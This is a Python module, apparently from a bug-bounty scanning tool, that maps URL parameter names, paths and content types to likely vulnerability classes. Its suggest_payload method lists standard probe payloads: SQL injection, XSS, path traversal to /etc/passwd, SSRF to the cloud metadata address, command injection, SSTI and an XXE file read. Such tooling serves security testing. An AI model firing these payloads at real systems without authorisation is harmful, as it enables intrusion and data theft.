#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ContextMapper — 上下文感知Payload映射器。

人类猎人本能: 看到 file= 就想LFI, 看到 id= 就想SQLi, 看到 email= 就想注入。
工具没有这个直觉。这个模块补上。

用法:
    from aimy.tools.context_mapper import ContextMapper
    cm = ContextMapper()
    payloads = cm.suggest(url="http://x.com?file=report.pdf")
    # -> [("lfi", "../../etc/passwd"), ("path_traversal", "..%2F..%2F"), ...]
"""

import re
from urllib.parse import urlparse, parse_qs
from typing import Any

# ── 参数名 → 漏洞类映射 ─────────────────────────────

PARAM_CONTEXT: dict[str, list[str]] = {
    # 文件操作类 → 优先测 LFI/PathTraversal
    "file":     ["lfi", "path_traversal"],
    "path":     ["lfi", "path_traversal"],
    "download": ["lfi", "path_traversal"],
    "read":     ["lfi", "path_traversal"],
    "include":  ["lfi", "path_traversal"],
    "template": ["lfi", "ssti"],
    "dir":      ["path_traversal"],
    "show":     ["lfi", "sqli"],
    "page":     ["lfi", "sqli"],
    "document": ["lfi", "xxe"],
    "pdf":      ["xxe", "lfi"],
    "xml":      ["xxe"],
    "upload":   ["arbitrary_file_upload"],

    # 身份标识 → 优先测 IDOR/SQLi
    "id":       ["sqli", "idor", "blind_sqli"],
    "uid":      ["sqli", "idor"],
    "pid":      ["sqli", "idor"],
    "gid":      ["sqli", "idor"],
    "user_id":  ["sqli", "idor"],
    "order_id": ["sqli", "idor"],
    "account":  ["idor", "sqli"],
    "number":   ["sqli", "idor"],
    "sku":      ["sqli", "idor"],

    # 用户输入 → 优先测 XSS/SQLi
    "q":        ["xss", "sqli", "ssti"],
    "search":   ["xss", "sqli", "ssti"],
    "keyword":  ["xss", "sqli"],
    "name":     ["xss", "sqli", "ssti"],
    "title":    ["xss", "sqli_quote"],
    "comment":  ["xss_stored", "sqli_quote"],
    "content":  ["xss_stored", "sqli_quote"],
    "message":  ["xss_stored", "sqli_quote"],
    "email":    ["xss", "sqli_quote", "email_injection"],
    "phone":    ["xss", "sqli", "type_juggling"],
    "address":  ["xss_stored", "sqli_quote"],

    # URL类 → 优先测 SSRF/OpenRedirect
    "url":      ["ssrf", "open_redirect"],
    "redirect": ["open_redirect", "ssrf"],
    "next":     ["open_redirect", "ssrf"],
    "return":   ["open_redirect", "ssrf"],
    "callback": ["ssrf", "open_redirect"],
    "webhook":  ["ssrf"],
    "endpoint": ["ssrf"],
    "image":    ["ssrf", "lfi"],
    "avatar":   ["lfi", "ssrf"],
    "link":     ["open_redirect", "ssrf"],
    "href":     ["open_redirect", "ssrf"],
    "target":   ["open_redirect", "ssrf"],
    "source":   ["ssrf", "lfi"],
    "host":     ["ssrf", "host_header"],

    # 命令执行类
    "cmd":      ["cmdi"],
    "command":  ["cmdi"],
    "exec":     ["cmdi"],
    "run":      ["cmdi"],
    "ping":     ["cmdi"],
    "nslookup": ["cmdi"],
    "ip":       ["cmdi", "ssrf"],

    # 配置/调试类
    "debug":    ["information_disclosure", "debug_endpoint"],
    "config":   ["information_disclosure", "lfi"],
    "setting":  ["information_disclosure"],
    "mode":     ["type_juggling", "auth_bypass"],
    "action":   ["csrf", "auth_bypass"],
    "method":   ["http_method_tampering", "auth_bypass"],
    "state":    ["business_logic", "type_juggling"],
    "step":     ["business_logic", "race_condition"],
    "token":    ["jwt", "idors"],
    "api_key":  ["information_disclosure"],
    "secret":   ["information_disclosure"],
    "auth":     ["jwt", "auth_bypass"],
    "session":  ["session_fixation", "idors"],

    # 业务逻辑类
    "price":    ["business_logic", "type_juggling"],
    "amount":   ["business_logic", "type_juggling"],
    "quantity": ["business_logic", "race_condition"],
    "coupon":   ["business_logic", "race_condition"],
    "discount": ["business_logic"],
    "total":    ["business_logic", "type_juggling"],
    "balance":  ["business_logic", "idor"],
    "role":     ["auth_bypass", "privilege_escalation"],
    "perm":     ["auth_bypass", "privilege_escalation"],
    "admin":    ["auth_bypass", "privilege_escalation"],
    "group":    ["auth_bypass", "idor"],
    "status":   ["business_logic", "type_juggling", "sqli"],
}

# ── URL路径 → 漏洞类映射 ────────────────────────────

PATH_CONTEXT: list[tuple[str, str, list[str]]] = [
    (r"(?i)/api/",        "api",       ["sqli", "idor", "bola", "mass_assignment"]),
    (r"(?i)/graphql",     "graphql",   ["graphql_introspection", "graphql_injection"]),
    (r"(?i)/admin/",      "admin",     ["auth_bypass", "privilege_escalation"]),
    (r"(?i)/login",       "auth",      ["auth_bypass", "brute_force", "mfa_bypass"]),
    (r"(?i)/register",    "auth",      ["business_logic", "mass_assignment"]),
    (r"(?i)/reset",       "auth",      ["password_reset", "token_leak"]),
    (r"(?i)/password",    "auth",      ["password_reset", "csrf"]),
    (r"(?i)/upload",      "upload",    ["arbitrary_file_upload", "lfi"]),
    (r"(?i)/download",    "file",      ["lfi", "path_traversal"]),
    (r"(?i)/search",      "search",    ["xss", "sqli", "ssti"]),
    (r"(?i)/export",      "export",    ["csv_injection", "ssrf", "lfi"]),
    (r"(?i)/import",      "import",    ["xxe", "arbitrary_file_upload"]),
    (r"(?i)/webhook",     "webhook",   ["ssrf", "cmdi"]),
    (r"(?i)/proxy",       "proxy",     ["ssrf"]),
    (r"(?i)/debug",       "debug",     ["information_disclosure"]),
    (r"(?i)/health",      "health",    ["information_disclosure"]),
    (r"(?i)/metrics",     "metrics",   ["information_disclosure"]),
    (r"(?i)/.git",        "git",       ["information_disclosure", "source_code_leak"]),
    (r"(?i)/.env",        "env",       ["information_disclosure", "secret_leak"]),
    (r"(?i)/swagger",     "docs",      ["information_disclosure", "unauth_access"]),
    (r"(?i)/api-docs",    "docs",      ["information_disclosure", "unauth_access"]),
    (r"(?i)/ws/",         "websocket", ["websocket_security"]),
    (r"(?i)/socket.io",   "websocket", ["websocket_security"]),
]

# ── Content-Type → 漏洞类映射 ────────────────────────

CONTENT_TYPE_MAP: dict[str, list[str]] = {
    "application/json":       ["mass_assignment", "prototype_pollution", "nosqli"],
    "application/xml":       ["xxe", "xpath_injection"],
    "text/xml":              ["xxe", "xpath_injection"],
    "multipart/form-data":   ["arbitrary_file_upload"],
    "application/x-www-form-urlencoded": [],  # 默认, 不限
}


class ContextMapper:
    """上下文感知Payload映射器。"""

    def __init__(self):
        pass

    def suggest(self, url: str = "", param: str = "",
                content_type: str = "") -> list[dict]:
        """根据上下文推荐最可能出洞的漏洞类。

        Args:
            url: 完整URL
            param: 参数名 (可选, 如果不传则从URL解析)
            content_type: Content-Type (可选)

        Returns:
            [{"vuln_class": "sqli", "priority": 1, "reason": "参数id通常存在SQL注入"},
             {"vuln_class": "idor", "priority": 2, "reason": "数字ID可遍历"}]
        """
        suggestions: list[dict] = []
        seen: set[str] = set()

        # 1. 参数名推断
        if not param:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for p in params:
                self._add_suggestions(suggestions, seen, p)

        # 2. 路径推断
        parsed = urlparse(url)
        path = parsed.path
        for pattern, label, vulns in PATH_CONTEXT:
            if re.search(pattern, path):
                for v in vulns:
                    if v not in seen:
                        suggestions.append({
                            "vuln_class": v,
                            "priority": 2,
                            "source": "path",
                            "reason": f"路径 {path} 匹配 {label}",
                        })
                        seen.add(v)
                break

        # 3. Content-Type推断
        ct = content_type.lower() if content_type else ""
        for ct_pattern, vulns in CONTENT_TYPE_MAP.items():
            if ct_pattern in ct:
                for v in vulns:
                    if v not in seen:
                        suggestions.append({
                            "vuln_class": v,
                            "priority": 3,
                            "source": "content_type",
                            "reason": f"Content-Type {ct} 通常存在 {v}",
                        })
                        seen.add(v)

        # 按优先级排序
        suggestions.sort(key=lambda x: x["priority"])
        return suggestions

    def _add_suggestions(self, suggestions: list, seen: set, param_name: str):
        """从参数名推断漏洞类。"""
        p = param_name.lower().strip()
        vulns = PARAM_CONTEXT.get(p, [])
        if not vulns:
            # 模糊匹配: 参数名包含关键词
            for key, vals in PARAM_CONTEXT.items():
                if key in p or p in key:
                    vulns = vals
                    break
        if not vulns:
            # 通用: 有参数的端点都试试sqli/xss
            vulns = ["sqli", "xss"]

        for i, v in enumerate(vulns):
            if v not in seen:
                suggestions.append({
                    "vuln_class": v,
                    "priority": i + 1,
                    "source": "param_name",
                    "reason": f"参数 {param_name} 通常存在 {v}",
                })
                seen.add(v)

    def rank(self, url: str = "", params: dict | None = None,
             content_type: str = "") -> list[dict]:
        """全量排序: 给出该URL最值得测的漏洞类型 TOP 5。"""
        all_suggestions: list[dict] = []

        # 从每个参数名推断
        if params:
            for p in params:
                self._add_suggestions(all_suggestions, set(), p)

        # 从路径推断
        if url:
            parsed = urlparse(url)
            path = parsed.path
            for pattern, label, vulns in PATH_CONTEXT:
                if re.search(pattern, path):
                    for v in vulns:
                        all_suggestions.append({
                            "vuln_class": v,
                            "priority": 2,
                            "source": "path",
                            "reason": f"路径 {path} → {label}",
                        })
                    break

        # 去重 + 聚合优先级
        seen: dict[str, int] = {}
        for s in all_suggestions:
            v = s["vuln_class"]
            seen[v] = min(seen.get(v, 99), s["priority"])

        ranked = [{"vuln_class": v, "priority": p}
                   for v, p in sorted(seen.items(), key=lambda x: x[1])]
        return ranked[:5]  # 只返回TOP5

    def suggest_payload(self, vuln_class: str, param: str = "") -> list[str]:
        """根据漏洞类型推荐具体payload (简短示例)。"""
        payloads: dict[str, list[str]] = {
            "sqli":            ["1 AND 1=1", "1' OR '1'='1", "1 UNION SELECT NULL"],
            "blind_sqli":      ["1 AND 1=1", "1 AND 1=2", "1 OR SLEEP(3)"],
            "xss":             ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            "lfi":             ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini"],
            "path_traversal":  ["..%2F..%2F..%2Fetc%2Fpasswd", "....//....//....//etc/passwd"],
            "ssrf":            ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80"],
            "open_redirect":   ["//evil.com", "https://evil.com"],
            "cmdi":            ["; id", "| whoami", "`id`"],
            "ssti":            ["{{7*7}}", "${7*7}", "#{7*7}"],
            "idor":            ["相邻ID: ±1", "UUID遍历"],
            "xxe":             ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"],
            "graphql_introspection": ["{__schema{types{name}}}"],
        }
        return payloads.get(vuln_class.lower(), ["暂无预设payload"])
